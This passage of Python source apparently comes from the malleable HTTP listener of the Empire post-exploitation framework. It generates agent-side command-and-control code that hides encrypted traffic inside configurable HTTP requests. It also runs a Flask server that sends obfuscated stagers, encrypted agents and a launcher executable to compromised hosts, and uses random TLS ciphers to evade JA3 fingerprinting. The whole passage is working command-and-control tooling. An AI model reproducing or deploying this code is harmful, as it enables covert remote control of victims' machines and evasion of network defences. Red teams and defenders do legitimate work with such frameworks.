        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
        return response
"""
            sendMessage += "    def send_message(self, packets=None):\n"
            sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"

            # ==== BUILD POST ====
            sendMessage += "        if packets:\n"

            # ==== BUILD ROUTING PACKET ====
            sendMessage += (
                "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
            )
            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
            sendMessage += (
                "\n".join(
                    [
                        "            " + _
                        for _ in profile.post.client.output.generate_python(
                            "routingPacket"
                        ).split("\n")
                    ]
                )
                + "\n"
            )

            # ==== CHOOSE URI ====
            sendMessage += (
                "            taskUri = random.sample("
                + str(profile.post.client.uris)
                + ", 1)[0]\n"
            )
            sendMessage += "            requestUri = self.server + taskUri\n"

            # ==== ADD PARAMETERS ====
            sendMessage += "            parameters = {}\n"
            for parameter, value in profile.post.client.parameters.items():
                sendMessage += (
                    "            parameters['" + parameter + "'] = '" + value + "'\n"
                )
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += (
                    "            parameters['"
                    + profile.post.client.output.terminator.arg
                    + "'] = routingPacket;\n"
                )
            sendMessage += "            if parameters:\n"
            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "            requestUri += routingPacket\n"

            # ==== ADD BODY ====
            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                sendMessage += "            body = routingPacket\n"
            else:
                sendMessage += "            body = '" + profile.post.client.body + "'\n"
            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"

            # ==== BUILD REQUEST ====
            sendMessage += "            req = vreq(requestUri, body)\n"
            sendMessage += "            req.verb = '" + profile.post.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.post.client.headers.items():
                sendMessage += (
                    "            req.add_header('" + header + "', '" + value + "')\n"
                )
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                sendMessage += (
                    "            req.add_header('"
                    + profile.post.client.output.terminator.arg
                    + "', routingPacket)\n"
                )

            # ==== BUILD GET ====
            sendMessage += "        else:\n"

            # ==== BUILD ROUTING PACKET
            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
            sendMessage += (
                "\n".join(
                    [
                        "            " + _
                        for _ in profile.get.client.metadata.generate_python(
                            "routingPacket"
                        ).split("\n")
                    ]
                )
                + "\n"
            )

            # ==== CHOOSE URI ====
            sendMessage += (
                "            taskUri = random.sample("
                + str(profile.get.client.uris)
                + ", 1)[0]\n"
            )
            sendMessage += "            requestUri = self.server + taskUri;\n"

            # ==== ADD PARAMETERS ====
            sendMessage += "            parameters = {}\n"
            for parameter, value in profile.get.client.parameters.items():
                sendMessage += (
                    "             parameters['" + parameter + "'] = '" + value + "'\n"
                )
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += (
                    "             parameters['"
                    + profile.get.client.metadata.terminator.arg
                    + "'] = routingPacket\n"
                )
            sendMessage += "            if parameters:\n"
            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"

            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "                requestUri += routingPacket;\n"

            # ==== ADD BODY ====
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                sendMessage += "                body = routingPacket\n"
            else:
                sendMessage += "            body = '" + profile.get.client.body + "'\n"
            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"

            # ==== BUILD REQUEST ====
            sendMessage += "            req = vreq(requestUri, body)\n"
            sendMessage += "            req.verb = '" + profile.get.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.get.client.headers.items():
                sendMessage += (
                    "            req.add_header('" + header + "', '" + value + "')\n"
                )
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.HEADER
            ):
                sendMessage += (
                    "            req.add_header('"
                    + profile.get.client.metadata.terminator.arg
                    + "', routingPacket)\n"
                )

            # ==== SEND REQUEST ====
            sendMessage += "        try:\n"
            sendMessage += "            res = urllib.request.urlopen(req);\n"

            # ==== EXTRACT RESPONSE ====
            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                header = profile.get.server.output.terminator.arg
                sendMessage += (
                    "            data = res.info().dict['"
                    + header
                    + "'] if '"
                    + header
                    + "' in res.info().dict else ''\n"
                )
                sendMessage += "            data = urllib.parse.unquote(data)\n"
            elif (
                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
            ):
                sendMessage += "            data = res.read()\n"

            # ==== DECODE RESPONSE ====
            sendMessage += (
                "\n".join(
                    [
                        "        " + _
                        for _ in profile.get.server.output.generate_python_r(
                            "data"
                        ).split("\n")
                    ]
                )
                + "\n"
            )
            # before return we encode to bytes, since in some transformations "join" produces str
            sendMessage += (
                "            if isinstance(data,str): data = data.encode('latin-1');\n"
            )
            sendMessage += "            return ('200', data)\n"

            # ==== HANDLE ERROR ====
            sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
            sendMessage += "            self.missedCheckins += 1\n"
            sendMessage += "            if HTTPError.code == 401:\n"
            sendMessage += "                sys.exit(0)\n"
            sendMessage += "            return (HTTPError.code, '')\n"
            sendMessage += "        except urllib.request.URLError as URLError:\n"
            sendMessage += "            self.missedCheckins += 1\n"
            sendMessage += "            return (URLError.reason, '')\n"

            sendMessage += "        return ('', '')\n"

            return sendMessage

        log.error(
            "listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # extract the set options for this instantiated listener
        bindIP = listenerOptions["BindIP"]["Value"]
        port = listenerOptions["Port"]["Value"]
        host = listenerOptions["Host"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        certPath = listenerOptions["CertPath"]["Value"]

        # build and validate profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.validate()

        # suppress the normal Flask output
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        if os.environ.get("TEST_MODE"):
            # Let's not start the server if we're running tests.
            while True:
                time.sleep(1)

        # initialize flask server
        app = Flask(__name__, template_folder=self.template_dir)
        self.app = app

        @app.route("/", methods=["GET", "POST"])
        @app.route("/<path:request_uri>", methods=["GET", "POST"])
        def handle_request(request_uri="", tempListenerOptions=None):
            """
            Handle an agent request.
            """
            data = request.get_data()
            clientIP = request.remote_addr
            url = request.url
            method = request.method
            headers = request.headers
            profile = malleable.Profile._deserialize(self.serialized_profile)

            # log request
            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: {request.method.upper()} request for {request.host}/{request_uri} from {clientIP} ({len(request.data)} bytes)"
            self.instance_log.info(message)

            try:
                # build malleable request from flask request
                malleableRequest = malleable.MalleableRequest()
                malleableRequest.url = url
                malleableRequest.verb = method
                malleableRequest.headers = headers
                malleableRequest.body = data

                # fix non-ascii characters
                if "%" in malleableRequest.path:
                    malleableRequest.path = urllib.parse.unquote(malleableRequest.path)

                # identify the implementation by uri
                implementation = None
                for uri in sorted(
                    (
                        profile.stager.client.uris
                        if profile.stager.client.uris
                        else ["/"]
                    )
                    + (profile.get.client.uris if profile.get.client.uris else ["/"])
                    + (profile.post.client.uris if profile.post.client.uris else ["/"]),
                    key=len,
                    reverse=True,
                ):
                    if request_uri.startswith(uri.lstrip("/")):
                        # match!
                        for imp in [profile.stager, profile.get, profile.post]:
                            if uri in (imp.client.uris if imp.client.uris else ["/"]):
                                implementation = imp
                                break
                        if implementation:
                            break

                if not implementation:
                    # log invalid uri
                    message = f"{listenerName}: unknown uri /{request_uri} requested by {clientIP}."
                    self.instance_log.warning(message)

                # attempt to extract information from the request
                if implementation is profile.stager and request.method == "POST":
                    # stage 1 negotiation comms are hard coded, so we can't use malleable
                    agentInfo = malleableRequest.body
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo from raw body, len={len(agentInfo) if agentInfo else 0}"
                    )
                elif implementation is profile.post:
                    # the post implementation has two spots for data, requires two-part extraction
                    agentInfo, output = implementation.extract_client(malleableRequest)
                    agentInfo = (agentInfo if agentInfo else b"") + (
                        output if output else b""
                    )
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo from post (two-part), len={len(agentInfo)}"
                    )
                else:
                    agentInfo = implementation.extract_client(malleableRequest)
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo via extract_client(), len={len(agentInfo) if agentInfo else 0}"
                    )

                if agentInfo:
                    agentInfo = listener_util.ensure_raw_bytes(agentInfo)
                    dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                        stagingKey,
                        self.agent_public_cert_key,
                        self.server_private_cert_key,
                        self.server_public_cert_key,
                        agentInfo,
                        listenerOptions,
                        clientIP,
                    )

                    if not dataResults or len(dataResults) <= 0:
                        # log error parsing routing packet
                        message = f"{listenerName} Error parsing routing packet from {clientIP}: {agentInfo!s}."
                        self.instance_log.error(message)
                        log.error(message)

                    for language, results in dataResults:
                        if results:
                            if isinstance(results, str):
                                results = results.encode("latin-1")
                            if results == b"STAGE0":
                                # step 2 of negotiation -> server returns stager (stage 1)

                                # log event
                                message = f"{listenerName} Sending {language} stager (stage 1) to {clientIP}"
                                self.instance_log.info(message)
                                log.info(message)

                                # build stager (stage 1)
                                with SessionLocal() as db:
                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )
                                    stager = self.generate_stager(
                                        language=language,
                                        listenerOptions=listenerOptions,
                                        obfuscate=(
                                            False
                                            if not obf_config
                                            else obf_config.enabled
                                        ),
                                        obfuscation_command=(
                                            "" if not obf_config else obf_config.command
                                        ),
                                    )

                                # build malleable response with stager (stage 1)
                                malleableResponse = implementation.construct_server(
                                    stager
                                )

                                if "Server" in malleableResponse.headers:
                                    WSGIRequestHandler.server_version = (
                                        malleableResponse.headers["Server"]
                                    )
                                    WSGIRequestHandler.sys_version = ""

                                return Response(
                                    malleableResponse.body,
                                    malleableResponse.code,
                                    malleableResponse.headers,
                                )

                            if results.startswith(b"STAGE2"):
                                # step 6 of negotiation -> server sends patched agent (stage 2)

                                if ":" in clientIP:
                                    clientIP = "[" + clientIP + "]"
                                sessionID = (
                                    results.split(b" ")[1].strip().decode("UTF-8")
                                )
                                sessionKey = self.mainMenu.agentcommsv2.agents[
                                    sessionID
                                ]["sessionKey"]

                                # log event
                                message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
                                self.instance_log.info(message)
                                log.info(message)

                                # TODO: handle this with malleable??
                                tempListenerOptions = None
                                if "Hop-Name" in request.headers:
                                    hopListenerName = request.headers.get("Hop-Name")
                                    if hopListenerName:
                                        try:
                                            hopListener = (
                                                data_util.get_listener_options(
                                                    hopListenerName
                                                )
                                            )
                                            tempListenerOptions = copy.deepcopy(
                                                listenerOptions
                                            )
                                            tempListenerOptions["Host"]["Value"] = (
                                                hopListener["Host"]["Value"]
                                            )
                                        except TypeError:
                                            tempListenerOptions = listenerOptions

                                session_info = (
                                    SessionLocal()
                                    .query(models.Agent)
                                    .filter(models.Agent.session_id == sessionID)
                                    .first()
                                )
                                if session_info.language == "ironpython":
                                    version = "ironpython"
                                else:
                                    version = ""

                                # generate agent
                                with SessionLocal() as db:
                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )
                                    agentCode = self.generate_agent(
                                        language=language,
                                        listenerOptions=(
                                            tempListenerOptions
                                            if tempListenerOptions
                                            else listenerOptions
                                        ),
                                        obfuscate=(
                                            False
                                            if not obf_config
                                            else obf_config.enabled
                                        ),
                                        obfuscation_command=(
                                            "" if not obf_config else obf_config.command
                                        ),
                                        version=version,
                                    )

                                sessionKey = bytes.fromhex(sessionKey)
                                encryptedAgent = AESCipher.encrypt_then_hmac(
                                    sessionKey, agentCode.encode("UTF-8")
                                )

                                # build malleable response with agent
                                # note: stage1 comms are hard coded, can't use malleable here.
                                return Response(
                                    packets.build_routing_packet(
                                        stagingKey,
                                        sessionID,
                                        language,
                                        encData=encryptedAgent,
                                    ),
                                    200,
                                    implementation.server.headers,
                                )

                            if results[:10].lower().startswith(b"error") or results[
                                :10
                            ].lower().startswith(b"exception"):
                                # agent returned an error
                                message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
                                self.instance_log.error(message)
                                log.error(message)

                                return Response(self.default_response(), 404)

                            if results.startswith(b"ERROR:"):
                                # error parsing agent data
                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
                                self.instance_log.error(message)
                                log.error(message)

                                if b"not in cache" in results:
                                    # signal the client to restage
                                    log.info(
                                        f"{listenerName} Orphaned agent from {clientIP}, signaling restaging"
                                    )
                                    return make_response("", 401)

                                return Response(self.default_response(), 404)

                            if results == b"VALID":
                                # agent posted results
                                message = f"{listenerName} Valid results returned by {clientIP}"
                                self.instance_log.info(message)

                                malleableResponse = implementation.construct_server("")

                                if "Server" in malleableResponse.headers:
                                    WSGIRequestHandler.server_version = (
                                        malleableResponse.headers["Server"]
                                    )
                                    WSGIRequestHandler.sys_version = ""

                                return Response(
                                    malleableResponse.body,
                                    malleableResponse.code,
                                    malleableResponse.headers,
                                )

                            if request.method == b"POST":
                                # step 4 of negotiation -> server returns RSA(nonce+AESsession))

                                message = (
                                    f"{listenerName}: Sending session key to {clientIP}"
                                )
                                self.instance_log.info(message)
                                log.info(message)

                                # note: stage 1 negotiation comms are hard coded, so we can't use malleable
                                return Response(
                                    results,
                                    200,
                                    implementation.server.headers,
                                )

                            # agent requested taskings
                            message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
                            self.instance_log.info(message)

                            # build malleable response with results
                            malleableResponse = implementation.construct_server(results)
                            if isinstance(malleableResponse.body, str):
                                malleableResponse.body = malleableResponse.body.encode(
                                    "latin-1"
                                )

                            if "Server" in malleableResponse.headers:
                                WSGIRequestHandler.server_version = (
                                    malleableResponse.headers["Server"]
                                )
                                WSGIRequestHandler.sys_version = ""

                            return Response(
                                malleableResponse.body,
                                malleableResponse.code,
                                malleableResponse.headers,
                            )

                        # no tasking for agent
                        message = (
                            f"{listenerName}: Agent from {clientIP} retrieved taskings"
                        )
                        self.instance_log.info(message)

                        # build malleable response with no results
                        malleableResponse = implementation.construct_server(results)

                        if "Server" in malleableResponse.headers:
                            WSGIRequestHandler.server_version = (
                                malleableResponse.headers["Server"]
                            )
                            WSGIRequestHandler.sys_version = ""

                        return Response(
                            malleableResponse.body,
                            malleableResponse.code,
                            malleableResponse.headers,
                        )

                else:
                    # If no agentinfo then attempt to send ironpython agent
                    with SessionLocal.begin() as db:
                        obfuscation_config = (
                            self.mainMenu.obfuscationv2.get_obfuscation_config(
                                db, "csharp"
                            )
                        )
                        obfuscation = obfuscation_config.enabled
                        launcher = self.mainMenu.stagergenv2.generate_launcher(
                            listener_name=listenerName,
                            language="python",
                            encode=False,
                            obfuscate=obfuscation,
                        )

                    directory = self.mainMenu.stagergenv2.generate_python_exe(
                        launcher, dot_net_version="net40", obfuscate=obfuscation
                    )
                    with open(directory, "rb") as f:
                        return f.read()

                # log invalid request
                message = (
                    f"/{request_uri} requested by {clientIP} with no routing packet."
                )
                self.instance_log.error(message)

            except malleable.MalleableError as e:
                # probably an issue with the malleable library, please report it :)
                message = f"{listenerName}: Malleable had trouble handling a request for /{request_uri} by {clientIP}: {e!s}."
                self.instance_log.error(message, exc_info=True)
                log.error(message, exc_info=True)

            return Response(self.default_response(), 200)

        try:
            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]

            if host.startswith("https"):
                if certPath.strip() == "" or not os.path.isdir(certPath):
                    log.info(f"Unable to find certpath {certPath}, using default.")
                    certPath = "setup"
                certPath = os.path.abspath(certPath)
                pyversion = sys.version_info

                # support any version of tls
                if (pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13) or (
                    pyversion[0] >= 3
                ):
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain(
                    f"{certPath}/empire-chain.pem",
                    f"{certPath}/empire-priv.key",
                )

                if ja3_evasion:
                    context.set_ciphers(listener_util.generate_random_cipher())

                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)
        except Exception as e:
            message = f"Listener startup on port {port} failed - {e.__class__.__name__}: {e!s}"
            self.instance_log.error(message, exc_info=True)
            log.error(message, exc_info=True)

    def start(self):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.thread property.
        """
        self.instance_log = log_util.get_listener_logger(
            LOG_NAME_PREFIX, self.options["Name"]["Value"]
        )
        listenerOptions = self.options
        self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
        self.thread.daemon = True
        self.thread.start()
        time.sleep(1)
        # returns True if the listener successfully started, false otherwise
        return self.thread.is_alive()

    def shutdown(self):
        """
        Terminates the server thread stored in the self.thread property.
        """
        to_kill = self.options["Name"]["Value"]
        self.instance_log.info(f"{to_kill}: shutting down...")
        log.info(f"{to_kill}: shutting down...")
        self.thread.kill()
